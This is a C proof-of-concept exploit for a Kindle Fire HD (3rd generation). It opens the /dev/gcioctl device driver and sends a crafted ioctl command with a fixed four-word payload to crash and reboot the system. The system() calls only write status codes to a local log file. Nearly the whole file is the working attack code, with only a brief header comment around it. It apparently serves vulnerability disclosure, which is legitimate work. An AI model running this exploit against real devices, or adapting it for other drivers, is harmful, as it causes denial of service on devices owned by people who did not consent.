/*
 * This is poc of Kindle Fire HD 3rd
 * A bug in the ioctl interface of device file /dev/gcioctl causes the system crash via IOCTL 3222560159. 
 * This Poc should run with permission to do ioctl on /dev/gcioctl.
 *
 */
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>

const static char *driver = "/dev/gcioctl";
static command = 3222560159; 

int main(int argc, char **argv, char **env) {
        unsigned int payload[] = { 0x244085aa, 0x1a03e6ef, 0x000003f4, 0x00000000 };

        int fd = 0;

        fd = open(driver, O_RDONLY);
        if (fd < 0) {
            printf("Failed to open %s, with errno %d\n", driver, errno);
            system("echo 1 > /data/local/tmp/log");
            return -1;
        }

        printf("Try open %s with command 0x%x.\n", driver, command);
        printf("System will crash and reboot.\n");
        if(ioctl(fd, command, &payload) < 0) {
            printf("Allocation of structs failed, %d\n", errno);
            system("echo 2 > /data/local/tmp/log");
            return -1;
        }
        close(fd);
        return 0;
}